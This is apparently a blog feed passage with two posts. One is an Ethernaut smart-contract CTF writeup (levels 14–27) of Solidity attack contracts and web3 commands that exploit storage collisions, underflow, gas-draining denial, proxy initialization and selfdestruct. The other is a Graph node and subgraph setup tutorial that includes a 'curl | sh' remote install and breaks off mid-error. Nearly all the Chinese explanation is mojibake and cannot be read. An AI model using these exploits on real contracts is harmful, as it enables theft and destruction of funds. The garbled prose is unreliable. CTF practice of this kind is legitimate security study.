bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1) Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface GatekeeperTwoInterface { function enter(bytes8 _gateKey) external returns (bool); } contract GatekeeperTwoAttack { GatekeeperTwoInterface gatekeeper; constructor(address GatekeeperTwoContractAddress) public { gatekeeper = GatekeeperTwoInterface(GatekeeperTwoContractAddress); bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1)); gatekeeper.enter(key); } } 15. Naught Coin ç›®æ¨™ balanceOf(player) = 0\nTransfer æœ‰å€‹ 10 å¹´çš„ lock period\n1 2 3 4 5 6 7 8 9 10 11 12 13 function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() { if (msg.sender == player) { require(now \u0026gt; timeLock); _; } else { _; } } NaughtCoin ç¹¼æ‰¿äº† openzeppelin ERC20ï¼šåˆ©ç”¨ approve() + transferFrom()\nExploit 1 2 3 totalBalance = await contract.balanceOf(player).then(v =\u0026gt; v.toString()) await contract.approve(player, totalBalance) await contract.transferFrom(player, contract.address, totalBalance) 16. Preservation ç›®æ¨™ owner = player\nè§€å¯Ÿ setFirstTime æœ‰å€‹ delegatecall\n1 2 3 4 // set the time for timezone 1 function setFirstTime(uint _timeStamp) public { timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } 1 2 3 4 5 6 7 8 9 contract LibraryContract { // stores a timestamp uint storedTime; function setTime(uint _time) public { storedTime = _time; } } ä»”ç´°çœ‹æœƒç™¼ç¾æœ‰ storage collisionï¼ŒstoredTime è·Ÿ timeZone1Library éƒ½åœ¨ slot 0ï¼Œå¯ä»¥æŠŠ timeZone1Library æ”¹æˆè‡ªå·±çš„åˆç´„ï¼Œå¯ä»¥è—‰ç”± delegatecall å‘¼å«è‡ªå·±çš„åˆç´„ï¼Œä¸¦åˆ©ç”¨ storage collision æ”¹æ‰ ownerã€‚\n1 2 3 4 5 6 | LibraryContract Preservation Exploit ---------------------------------------------------------------------- slot 0 | storedTime \u0026lt;- timeZone1Library timeZone1Library slot 1 | _ timeZone2Library timeZone2Library slot 2 | _ owner owner slot 3 | _ storedTime Exploit 1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract PreservationAttack { address public timeZone1Library; address public timeZone2Library; address public owner; function setTime(uint _time) public { owner = msg.sender; } } 1 2 await contract.setFirstTime(exp) await contract.setFirstTime(1) 17. Recovery ç›®æ¨™æ‰¾åˆ° simpleToken çš„ address ä¸¦è®“ä»–çš„ ether æ­¸ 0\nå» XXXscan ä¸Šè§€å¯Ÿ addressï¼Œåˆ©ç”¨ selfdestruct å°‡åˆç´„çš„ ether å…¨æ•¸è½‰å‡º\næ­£è¦è§£æ³•è¦ç®—å‡º contract address\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 pragma solidity ^0.8.0; interface ISimpleToken { function destroy(address payable _to) external; } contract Exp { function withdraw(address _addr) public { ISimpleToken(_addr).destroy(payable(msg.sender)); } } 18. MagicNumber ç›®æ¨™å¯«å‡ºæœ€å¤šåªèƒ½ç”¨åˆ° 10 opcodes çš„åˆç´„ï¼Œéœ€å›å‚³ magic number 42\nRuntime code return 42(0x2a)ï¼ŒRETURN æœ‰ 2 å€‹åƒæ•¸: positionã€sizeï¼Œå…ˆå°‡ 42 å­˜é€² memory å†å¾ memory è®€å‡ºä¾†ä¸¦å›å‚³\nmstore(position, value) 1 2 3 602a Push 0x2a in stack. 6050 Push 0x50 in stack. 52 Mstore return(position, size) 1 2 3 6020 Push 0x20(32 bytes) in stack. 6050 Push 0x50 in stack. f3 RETURN runtime opcodes å‰›å¥½ 10 bytes\n1 602a60505260206050f3 Init code å¯ä»¥éƒ¨ç½²ä¸€å€‹åˆç´„çœ‹çœ‹é•·æ€æ¨£\nExploit 1 2 3 4 bytecode = \u0026#39;600a600c600039600a6000f3602a60505260206050f3\u0026#39; txn = await web3.eth.sendTransaction({from: player, data: bytecode}) solverAddr = txn.contractAddress await contract.setSolver(solverAddr) 19. Alien Codex ç›®æ¨™ owner = player\nAlienCodex ç¹¼æ‰¿äº† Ownableï¼Œowner å¿…å®šåœ¨ Ownable-05.sol ä¸­ï¼Œstorage å¾ Ownable-05.sol é–‹å§‹æ’ï¼Œstorage ç¸½å…±æœ‰ 2^256 å€‹ slotã€‚\nå¾ slot 0 é–‹å§‹çœ‹ owner åˆ°åº•åœ¨å“ªå€‹ slot\næ³¨æ„ solidity ç‰ˆæœ¬ 0.5.0 -\u0026gt; overflow/underflow?\nDynamic array codex çš„ data[0] å­˜æ”¾åœ¨ slot p = keccak256(1)ï¼Œdata[1] åœ¨ keccak256(1)+1ï¼Œä»¥æ­¤é¡æ¨ã€‚\n1 2 3 4 5 6 7 8 slot 0: contact | owner slot 1: codex.length ... slot p: codex[0] slot p+1: codex[1] ... slot 2^256-1:codex[2^256 - 1 - p] slot 0 codex[2^256 - p] çœ‹åˆ° retract() å¯ä»¥æ”¹è®Š lengthï¼Œè®“ length overflowï¼Œåˆå› ç‚ºç¸½å…±åªæœ‰ 2^256 å€‹ slotï¼Œå¿…å®šå­˜åœ¨ i ä½¿å¾— codex[i] å­˜åœ¨ slot 0ï¼Œå¯ä»¥ç”¨ revise() æ”¹æ‰åœ¨ slot 0 çš„ ownerã€‚\n1 2 3 function retract() contacted public { codex.length--; } Exploit 1 2 3 4 5 6 await contract.make_contact() await contract.retract() p = web3.utils.keccak256(web3.eth.abi.encodeParameters([\u0026#34;uint256\u0026#34;], [1])) i = BigInt(2 ** 256) - BigInt(p) content = \u0026#39;0x000000000000000000000000\u0026#39; + player.slice(2) await contract.revise(i, content) 20. Denial ç›®æ¨™è®“ owner ç„¡æ³•é€é withdraw() æˆåŠŸææ¬¾\n1 2 3 4 5 6 7 8 9 10 11 // withdraw 1% to recipient and 1% to owner function withdraw() public { uint amountToSend = address(this).balance.div(100); // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call{value:amountToSend}(\u0026#34;\u0026#34;); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend); } line 7 æœƒåš transferï¼Œåœ¨ line 6 å‹•æ‰‹è…³ï¼Œcall ç„¡é™åˆ¶ gas ç”¨é‡ï¼Œé€éé‡å…¥æˆ–å…¶ä»–æ“ä½œé”æˆ revert: out of gas exceptionã€‚\nExploit æ–°ç‰ˆæœ¬å¥½åƒä¸èƒ½é€™æ¨£æäº†\n1 2 3 4 5 6 7 8 9 10 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract DenialAttack { fallback() external payable { // consume all the gas assert(false); } } or\n1 2 3 4 5 6 7 8 9 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract DenialAttack { fallback() external payable { while(true) {} } } è¨­å®š parnter\n1 await contract.setWithdrawPartner(exp) 21. Shop ç›®æ¨™ price \u0026lt; 100\nèˆ‡ 11. é¡ä¼¼ï¼Œä½† price() æœ‰ view å±¬æ€§ï¼Œèª¿ç”¨ view functionï¼Œé è¨­ä½¿ç”¨ staticcall\n1 2 3 4 5 6 7 8 function buy() public { Buyer _buyer = Buyer(msg.sender); if (_buyer.price() \u0026gt;= price \u0026amp;\u0026amp; !isSold) { isSold = true; price = _buyer.price(); } } line 4 éœ€å›å‚³ \u0026gt; 100ï¼Œline 6 éœ€å›å‚³ \u0026lt; 100ï¼Œå¯ä»¥è—‰ç”± isSold çš„æ”¹è®Šåˆ¤æ–·\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IShop { function buy() external; function isSold() external view returns (bool); } contract ShopAttack { function price() external view returns (uint) { return IShop(msg.sender).isSold() ? 1 : 100; } function attack(address _shopAddr) external { IShop(_shopAddr).buy(); } } 22. DEX player æœ‰ 10 token1 åŠ 10 token2ï¼ŒDEX æœ‰ 100 token1 åŠ 100 token2\nç›®æ¨™å°‡ DEX å…¶ä¸­ä¸€ç¨® token æ¸…ï¼\nswap() åˆ©ç”¨ get_swap_price() ç‚º amount\n1 2 3 4 5 6 7 8 function swap(address from, address to, uint amount) public { require((from == token1 \u0026amp;\u0026amp; to == token2) || (from == token2 \u0026amp;\u0026amp; to == token1), \u0026#34;Invalid tokens\u0026#34;); require(IERC20(from).balanceOf(msg.sender) \u0026gt;= amount, \u0026#34;Not enough to swap\u0026#34;); uint swap_amount = get_swap_price(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swap_amount); IERC20(to).transferFrom(address(this), msg.sender, swap_amount); } get_swap_price() ç›´æ¥ç”¨ balance ç›¸é™¤è¨ˆç®—ï¼Œå¯èƒ½æœƒæœ‰èª¤å·®ï¼ˆ3/2=1)\n1 2 3 function get_swap_price(address from, address to, uint amount) public view returns(uint){ return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); } Exploit 1 2 3 4 5 6 await contract.swap(t1, t2, 10) await contract.swap(t2, t1, 20) await contract.swap(t1, t2, 24) await contract.swap(t2, t1, 30) await contract.swap(t1, t2, 41) await contract.swap(t2, t1, 45) 23. Dex Two æ¦¨ä¹¾ DEX çš„ token1 åŠ token2\nèˆ‡ 22. ç›¸æ¯”ï¼Œswap() ç¼ºå°‘ä¸€è¡Œï¼š\n1 require((from == token1 \u0026amp;\u0026amp; to == token2) || (from == token2 \u0026amp;\u0026amp; to == token1), \u0026#34;Invalid tokens\u0026#34;); æ‰€ä»¥æ‹¿åˆ¥çš„ token åš swap å°±å®Œäº‹äº†\nExploit 1 2 3 4 5 6 7 8 9 10 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#34;@openzeppelin/contracts/token/ERC20/ERC20.sol\u0026#34;; contract EvilToken is ERC20 { constructor(uint256 initialSupply) ERC20(\u0026#34;EvilToken\u0026#34;, \u0026#34;EVL\u0026#34;) { _mint(msg.sender, initialSupply); } } 1 2 await contract.swap(evlToken1, t1, 100) await contract.swap(evlToken2, t2, 100) 24. Puzzle Wallet ç›®æ¨™ admin = player\næœ‰é›£åº¦çš„ä¸€é¡Œï¼Œå¹¾å€‹è§€å¯Ÿï¼š\napproveNewAdmin() å¯æ”¹ adminï¼Œä½†æœ‰ modifier onlyAdminï¼Œæ­¤è·¯è¡Œä¸é€š PuzzleWallet æ¯å€‹ function éƒ½æœ‰ modifier onlyWhitelistedï¼Œowner å¯ä»¥åŠ ç™½åå–® PuzzleProxy çš„ pendingAdmin è·Ÿ PuzzleWallet çš„ owner å…±ç”¨åŒä¸€å€‹ slot 0 maxBalance è·Ÿ admin éƒ½åœ¨ slot 1 é€éæ›´æ”¹ pendingAdmin é”æˆæ”¹ ownerï¼Œæˆç‚º owner å¾ŒåŠ ç™½åå–®ï¼Œæ”¹ maxBalance ç‚º playerï¼Œadmin å³ç‚º playerã€‚\nsetMaxBalance() å¡äº†ä¸€å€‹ address(this).balance == 0 è¦ç¹é\n1 2 3 4 function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted { require(address(this).balance == 0, \u0026#34;Contract balance is not 0\u0026#34;); maxBalance = _maxBalance; } å…ˆç¢ºå®šä¸€ä¸‹ balance\n1 2 await getBalance(contract.address) // Output: 0.001 æ€è€ƒåœ¨åŒä¸€å€‹äº¤æ˜“èª¿ç”¨2æ¬¡ deposit()ï¼Œå› ç‚º multicall() å…±ç”¨ä¸€å€‹ msg.valueï¼Œé€™æ¨£å¯ä»¥åªè½‰ä¸€ç­† ether ä½† balance æœƒæ˜¯2å€ã€‚\næ³¨æ„åˆ° multicall() line 9 é™åˆ¶ deposit åªèƒ½ call ä¸€æ¬¡\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function multicall(bytes[] calldata data) external payable onlyWhitelisted { bool depositCalled = false; for (uint256 i = 0; i \u0026lt; data.length; i++) { bytes memory _data = data[i]; bytes4 selector; assembly { selector := mload(add(_data, 32)) } if (selector == this.deposit.selector) { require(!depositCalled, \u0026#34;Deposit can only be called once\u0026#34;); // Protect against reusing msg.value depositCalled = true; } (bool success, ) = address(this).delegatecall(data[i]); require(success, \u0026#34;Error while delegating call\u0026#34;); } } ç¹é line 9: åœ¨ multicall è£¡é¢åŒ… 2 multicallï¼Œè£¡é¢åˆ†åˆ¥èª¿ç”¨ deposit()\nåŸæœ¬æƒ³æ³•ï¼š\n1 2 multicall -\u0026gt; deposit -\u0026gt; deposit è®Šæˆï¼š\n1 2 multicall -\u0026gt; multicall -\u0026gt; deposit -\u0026gt; multicall -\u0026gt; deposit Exploit èª¿ç”¨ proposeNewAdmin() 1 2 3 4 5 6 7 8 9 10 11 12 13 Signature = { name: \u0026#39;proposeNewAdmin\u0026#39;, type: \u0026#39;function\u0026#39;, inputs: [ { type: \u0026#39;address\u0026#39;, name: \u0026#39;_newAdmin\u0026#39; } ] } params = [player] data = web3.eth.abi.encodeFunctionCall(Signature, params) await web3.eth.sendTransaction({from: player, to: instance, data}) èª¿ç”¨ addToWhitelist() åˆ©ç”¨ multicall deposit() twice execute() é ˜éŒ¢ setMaxBalance() è¨­ç‚º player 1 2 3 4 5 6 await contract.addToWhitelist(player) depositData = await contract.methods[\u0026#34;deposit()\u0026#34;].request().then(v =\u0026gt; v.data) multicallData = await contract.methods[\u0026#34;multicall(bytes[])\u0026#34;].request([depositData]).then(v =\u0026gt; v.data) await contract.multicall([multicallData, multicallData], {value: toWei(\u0026#39;0.001\u0026#39;)}) await contract.execute(player, toWei(\u0026#39;0.002\u0026#39;), 0x0) await contract.setMaxBalance(player) 25. Motorbike selfdestruct the engine\nEIP-1967 Standard Proxy Storage Slots implementation å’Œ adminï¼Œåˆ†åˆ«å­˜é‚è¼¯åˆç´„åœ°å€å’Œç®¡ç†å“¡åœ°å€ å¦‚æœæ”¾åœ¨ slot 0ã€slot 1ï¼Œå¯èƒ½æœƒæœ‰ storage collision çš„å•é¡Œ EIP-1967 æå‡ºæŠŠ implementation å’Œ admin æ”¾åœ¨äº†å…©å€‹ç‰¹æ®Šçš„ slot ä¸­ 1 2 // keccak-256 hash of \u0026#34;eip1967.proxy.implementation\u0026#34; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; Engine åˆç´„ä¸­ç„¡ selfdestructï¼Œä½† _upgradeToAndCall() ä¸­æœ‰å€‹ delegatecallï¼Œå¯ä»¥é€éä»–å‘¼å« selfdestructã€‚\nå…ˆæ‰¾ä¸€ä¸‹ engine åˆç´„çš„åœ°å€ï¼Œå­˜åœ¨ slot _IMPLEMENTATION_SLOT ä¸­ï¼š\n1 Addr = await web3.eth.getStorageAt(contract.address, \u0026#39;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\u0026#39;) åŸå‰‡ä¸Š engine åªè² è²¬é‚è¼¯ï¼Œå› æ­¤æ‡‰ç•¶æ²’æœ‰è¢«åˆå§‹åŒ–éï¼Œå¯èª¿ç”¨ initialize() åšåˆå§‹åŒ–ã€‚ æ¥è‘— upgradeToAndCall()ï¼Œå®Œæˆ selfdestructã€‚\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 // SPDX-License-Identifier: MIT pragma solidity \u0026lt;0.7.0; import \u0026#34;@openzeppelin/contracts/utils/Address.sol\u0026#34;; contract MotorbikeAttack { // Address of current implementation (The Engine) address public implementation; event Check(bool result); constructor(address impl) public { implementation = impl; } function takeControl() external returns(bytes memory) { // take control over the Engine Address.functionCall(implementation, abi.encodeWithSignature(\u0026#34;initialize()\u0026#34;)); } function destroy() external { // Upgrade the engine to a contract that selfdestruct once initialized Exploit exploit = new Exploit(); Address.functionCall( implementation, abi.encodeWithSignature( \u0026#34;upgradeToAndCall(address,bytes)\u0026#34;, address(exploit), abi.encodeWithSignature(\u0026#34;initialize()\u0026#34;) ) ); } function validateItIsBroken() external { emit Check(Address.isContract(implementation)); } } contract Exploit { function initialize() external { selfdestruct(msg.sender); } } 26. Double Entry Point è‡ªå·±å¯«å€‹ forta bot\néœ€å¯¦ä½œ handleTransaction()\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 pragma solidity ^0.8.0; interface IForta { function raiseAlert(address user) external; } contract MyDetectionBot { function handleTransaction(address user, bytes calldata msgData) external { IForta(msg.sender).raiseAlert(user); } } è¨­å®š bot\n1 2 3 4 5 6 7 8 9 10 11 botAddr = \u0026#39;0x...\u0026#39; forta = await contract.forta() setBotSig = web3.eth.abi.encodeFunctionCall({ name: \u0026#39;setDetectionBot\u0026#39;, type: \u0026#39;function\u0026#39;, inputs: [ { type: \u0026#39;address\u0026#39;, name: \u0026#39;detectionBotAddress\u0026#39; } ] }, [botAddr]) await web3.eth.sendTransaction({from: player, to: forta, data: setBotSig }) 27. Good Samaritan æ¸…ç©º wallet çš„ balance\nä¸€ç›´ request é¡¯ç„¶ä¸æ˜¯æ­£è§£\ntarnsfer() æœƒé€² notify()ï¼Œdest_ å¯ä»¥è‡ªè¡ŒæŒ‡å®šï¼Œå¯èƒ½å¯ä»¥åšä¸€äº›äº‹\n1 2 3 4 if(dest_.isContract()) { // notify contract INotifyable(dest_).notify(amount_); } line 8 æŠŠéŒ¢å…¨éƒ¨è½‰çµ¦ msg.senderï¼Œcoolï¼Œé€™å°±æ˜¯æˆ‘å€‘è¦çš„ï¼Œæ–¼æ˜¯åœ¨ notify è£¡é¢å¯«å€‹ err NotEnoughBalance() å°±è¡Œã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 function requestDonation() external returns(bool enoughBalance){ // donate 10 coins to requester try wallet.donate10(msg.sender) { return true; } catch (bytes memory err) { if (keccak256(abi.encodeWithSignature(\u0026#34;NotEnoughBalance()\u0026#34;)) == keccak256(err)) { // send the coins left wallet.transferRemainder(msg.sender); return false; } } } Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#34;../levels/GoodSamaritan.sol\u0026#34;; error NotEnoughBalance(); contract GoodSamaritanAttack { function attack(address _goodSamaritan) external { GoodSamaritan(_goodSamaritan).requestDonation(); } function notify(uint256 amount_) external pure { if(amount_ \u0026lt;= 10) { revert NotEnoughBalance(); } } } ","date":"2022-08-26T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/ethernaut-writeup/","title":"Ethernaut Writeup"},{"content":"å‰è¨€ é–‹é–‹å¿ƒå¿ƒå­¸ the graph\nå¾ subgraph æ’°å¯«ã€æ­å»ºæœ¬åœ° graph node åˆ°éƒ¨ç½² subgraph\nIntroduction The Graph is a decentralized protocol for indexing and querying data from blockchains, starting with Ethereum.\nThe graph ç‚ºä¸€å€‹å»ä¸­å¿ƒåŒ–ç´¢å¼•å”è­°ï¼Œç”¨æ–¼ç´¢å¼•å’ŒæŸ¥è©¢å€å¡Šéˆçš„æ•¸æ“šã€‚\nIt makes it possible to query data that is difficult to query directly.\nThe graph ä½¿é‚£äº›é›£ä»¥ç›´æ¥æŸ¥è©¢çš„æ•¸æ“šè®Šæˆå¯èƒ½ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘æƒ³è¦å–å¾—æŸå€‹ç”¨æˆ¶åœ¨ Uniswap åœ¨å„å€‹ pool æœ‰å¤šå°‘è³‡ç”¢ï¼Œéå»å¯ä»¥é€éé€£æ¥éˆä¸Š endpointã€ç™¼èµ· RPC callã€èª¿ç”¨åˆç´„æ¥å£é”æˆã€‚å…·é«”ä¾†èªªï¼š\nå–å¾—ç¸½å…±æœ‰å¹¾å€‹ pool å–å¾—æ‰€æœ‰ pool çš„åˆç´„åœ°å€ éæ­·æ‰€æœ‰ pool åˆç´„å–å¾—è©²ç”¨æˆ¶çš„ balance ä½†æ˜¯é€™éº¼åšæœ‰å¹¾å€‹ç¼ºé»ï¼š\nendpoint çš„ request æ™‚é–“å¯èƒ½è¼ƒé•· éœ€ç™¼å‡ºå¤šå€‹ RPC callï¼Œç•¢ç«Ÿå¯æ˜¯æœ‰å¥½å¹¾ç™¾å€‹ pool\u0026hellip; ä»¥ä¸Šä¾‹å­åˆ©ç”¨ the graph çš„è©±åªéœ€è¦ä¸€å€‹ query å°±èƒ½é”æˆ:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { users(where: {id:\u0026#34;0x4de7009354f32b950052d4556695c04449820849\u0026#34;}) { id liquidityPositions{ liquidityTokenBalance pair { token0 { symbol totalSupply } token1 { symbol totalSupply } } } } } å¯ä»¥æ­é… Debank çœ‹çœ‹çµæœ\nThe graph é™¤äº†å¯ä»¥è§£æ±ºæŸäº›æƒ…å¢ƒçš„æ•ˆèƒ½ç“¶é ¸ï¼Œæœ‰æ™‚å€™æ ¹æ“šåˆç´„æ¥å£ç”šè‡³æ²’è¾¦æ³•å–å¾—æˆ‘å€‘éœ€è¦çš„æ•¸æ“šï¼Œæ‰€ä»¥éœ€è¦æ ¹æ“šéœ€æ±‚æå‰æ§‹å»ºç´¢å¼•ï¼Œthe graph å‰‡æœƒæ ¹æ“šè¦å‰‡ç´¢å¼•éˆä¸Šæ•¸æ“šï¼Œä½¿ç”¨è€…å¯ä»¥é€é GraphQL API æŸ¥è©¢æ•¸æ“šã€‚\né¡Œå¤–è©±ï¼Œ multicall å¯ä»¥åƒè€ƒå…”å­å“¥ï¼šhttps://github.com/banteg/multicall.py\nThe graph protocol The Graph æ ¹æ“šå­åœ–æè¿°ï¼ˆsubgraph manifestï¼‰ä¾†å­¸ç¿’ä»€éº¼ä»¥åŠå¦‚ä½•ç´¢å¼•éˆä¸Šæ•¸æ“šã€‚Subgraph manifest å®šç¾©äº†å­åœ–çš„ data source (æ™ºèƒ½åˆç´„)ï¼Œä»¥åŠæ­¤åˆç´„è¦è™•ç†çš„ eventï¼Œé‚„æœ‰å¦‚ä½•å°‡ event æ•¸æ“š mapping åˆ°è³‡æ–™åº«ã€‚\næŸ¥è©¢åŠç´¢å¼•éƒ½æ˜¯é€é graph node å®Œæˆï¼Œå•Ÿå‹•å¾Œæœƒé€£æ¥å€å¡Šéˆç¯€é»åŠ IPFSã€‚\nä»¥ä¸‹èˆ‰å€‹ä¾‹å­ï¼š\nå®šç¾©äº†ä¸€å€‹æœƒè¨˜éŒ„æŸ token æ‰€æœ‰ transfer event çš„å­åœ–ã€‚ ç”¨æˆ¶é€éä¸€ç­† transaction è½‰äº† token çµ¦å¦ä¸€å€‹äººï¼ˆtransfer)ã€‚ ç•¶åˆç´„è™•ç†æ­¤äº¤æ˜“çš„æ™‚å€™è§¸ç™¼äº† transfer eventã€‚ Graph node æŒçºŒæƒæå€å¡Šã€‚ ç•¶æŸå€å¡ŠåŒ…å« transfer eventï¼Œgraph node æœƒåŸ·è¡Œ mapping è™•ç†ç¨‹åºï¼Œä¸¦å°‡è™•ç†å¥½çš„è³‡æ–™å„²å­˜ã€‚ é€é GraphQL API å¯ä»¥æŸ¥è©¢åˆ°ç´¢å¼•ä¸‹ä¾†çš„æ•¸æ“šã€‚ Graph node éƒ¨ç½² Running a graph node using Docker https://github.com/graphprotocol/graph-node/tree/master/docker\næ³¨æ„ï¼Œä½¿ç”¨ Macbook M1 è«‹è¦‹æ­¤é€£çµé‡æ–° build image: https://github.com/graphprotocol/graph-node/tree/v0.26.0/docker#running-graph-node-on-an-macbook-m1\n1 2 3 git clone https://github.com/graphprotocol/graph-node.git cd docker docker-compose up Running a local graph node rust å®‰è£…\n1 curl --proto \u0026#39;=https\u0026#39; --tlsv1.2 https://sh.rustup.rs -sSf | sh Postgresql å®‰è£…\n1 brew install postgresql IPFS å®‰è£\n1 brew install ipfs Start Up an IPFS Node\n1 2 ipfs init ipfs daemon Create the Postgres databas\n1 2 3 initdb -D .postgres pg_ctl -D .postgres -l logfile start createdb graph-node Start the Graph Node\n1 2 3 4 5 6 git clone https://github.com/graphprotocol/graph-node.git cd graph-node cargo run -p graph-node --release -- \\ --postgres-url postgresql://USERNAME:PASSWORD@127.0.0.1:5432/graph-node \\ --ethereum-rpc mainnet:\u0026lt;ETHEREUM_RPC\u0026gt; \\ --ipfs 127.0.0.1:5001 Try your OS username as USERNAME and PASSWORD\nSubgraph ä»¥ WETH token ç‚ºä¾‹ï¼š https://github.com/ashirleyshe/subgraph/tree/main/weth-erc20\næ–¼ Subgraph studio çš„éƒ¨ç½²ï¼šhttps://api.studio.thegraph.com/query/27930/weth-subgraph/v0.1.1/graphql\néœ€è¦å¯«çš„éƒ¨åˆ†ï¼š\nsubgraph.yaml: subgraph manifest schema.graphql: GraphQL schema å®šç¾©å­åœ–è³‡æ–™(entity)å¦‚ä½•å„²å­˜åŠå¦‚ä½•é€é GraphQL query AssemblyScript Mappings:Â AssemblyScriptÂ code å°‡ event data è½‰æˆ schema ä¸­çš„ entity Reference: https://docs.openzeppelin.com/subgraphs/0.1.x/\nä½¿ç”¨ Openzeppelin subgraph library\nç•¶è¦æ”¯æ´å¤šå€‹ erc20 æ™‚ï¼Œç·¨å¯« manifest å¯ä»¥è—‰ç”±å¥—ä»¶å®Œæˆ(@amxx/graphprotocol-utils):\nå…ˆæº–å‚™configï¼Œè£¡é¢å¡«å¯« datasource ä¹Ÿå°±æ˜¯ token addressï¼Œç¯„ä¾‹ï¼šhttps://github.com/OpenZeppelin/openzeppelin-subgraphs/blob/main/configs/top-erc20.json\nç”Ÿæˆ schema åŠ manifest\n1 2 3 4 5 npx graph-compiler \\ --config sample.json \\ --include node_modules/@openzeppelin/subgraphs/src/datasources \\ --export-schema \\ --export-subgraph éƒ¨ç½² subgraph package.json åœ¨ script ä¸­å¢åŠ  \u0026ldquo;create-local\u0026rdquo; \u0026ldquo;remove-local\u0026rdquo; \u0026ldquo;deploy-local\u0026rdquo; æ–¹ä¾¿å¾ŒçºŒéƒ¨ç½²\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 { \u0026#34;name\u0026#34;: \u0026#34;gravity\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;UNLICENSED\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;codegen\u0026#34;: \u0026#34;graph codegen\u0026#34;, \u0026#34;build\u0026#34;: \u0026#34;graph build\u0026#34;, \u0026#34;deploy\u0026#34;: \u0026#34;graph deploy --node https://api.studio.thegraph.com/deploy/ gravity\u0026#34;, \u0026#34;create-local\u0026#34;: \u0026#34;graph create --node http://127.0.0.1:8020/ gravity\u0026#34;, \u0026#34;remove-local\u0026#34;: \u0026#34;graph remove --node http://127.0.0.1:8020/ gravity\u0026#34;, \u0026#34;deploy-local\u0026#34;: \u0026#34;graph deploy --node http://127.0.0.1:8020/ --ipfs http://127.0.0.1:5001 gravity\u0026#34; }, \u0026#34;dependencies\u0026#34;: { \u0026#34;@graphprotocol/graph-cli\u0026#34;: \u0026#34;0.29.2\u0026#34;, \u0026#34;@graphprotocol/graph-ts\u0026#34;: \u0026#34;0.26.0\u0026#34; } } 1 2 3 4 5 6 7 8 9 10 yarn # Code Generation yarn codegen # Build yarn build yarn create-local yarn deploy-local å®Œæˆ subgraph éƒ¨ç½²åï¼Œä¾¿æœƒå¾æŸå€‹å€å¡Šé–‹å§‹æ§‹å»ºç´¢å¼•\nChecking Subgraph health https://thegraph.com/docs/hostedservice/deploy-subgraph-hosted#checking-subgraph-health\nsubgraph sync status å¯ä»¥åœ¨é€™é‚Šçœ‹åˆ°ï¼šé è¨­ port 8030/subgraph\nExample query:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 { indexingStatusForCurrentVersion(subgraphName: \u0026#34;org/subgraph\u0026#34;) { synced health fatalError { message block { number hash } handler } chains { chainHeadBlock { number } latestBlock { number } } } } Performance Improvement Two Simple Subgraph Performance Improvements\nhttps://medium.com/edge-node-engineering/two-simple-subgraph-performance-improvements-a76c6b3e7eac\nUsing immutable entities and Bytes as the id\nGraph Node Environment Variables\nhttps://github.com/graphprotocol/graph-node/blob/master/docs/environment-variables.md CallHandler\nThe graph å®˜æ–¹æ¨è–¦ä½¿ç”¨ EventHandler å°±å¥½ï¼Œä½¿ç”¨ CallHandler å¯èƒ½å°è‡´åŒæ­¥æ•ˆç‡ç·©æ…¢ã€‚ Substreams\nhttps://thegraph.com/blog/substreams-parallel-processing åŸå…ˆçš„ RPC-based Subgraphs ä½¿ç”¨ linear indexing model (ä¸€å€‹ event è™•ç†å®Œæ‰èƒ½è™•ç†ä¸‹ä¸€å€‹) Substreams take things even further by enabling massively parallelized streaming data. ä¸€äº›å‘ HTTP error creating the subgraph: ECONNREFUSED 1 2 3 4 5 6 7 âœ weth-erc20 yarn create-local yarn run v1.22.19 warning ../package.json: No license field $ graph create --node http://localhost:8020/ weth-erc20 âœ– HTTP error creating the subgraph: ECONNREFUSED error Command failed with exit code 1. info Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command. â†’ localhost æ”¹æˆ 127.0.0.1 å³å¯\nFailed to get entities from store: column c.block$ does not exist 1 2 3 4 5 6 7 { \u0026#34;errors\u0026#34;: [ { \u0026#34;message\u0026#34;: \u0026#34;Failed to get entities from store: column c.block$ does not exist, query = /* qid: 431b3891025ffb2d-6dc8c4ef99f8cc6a */\\nselect \u0026#39;ERC20Deposit\u0026#39; as entity, to_jsonb(c.*) as data from (select * 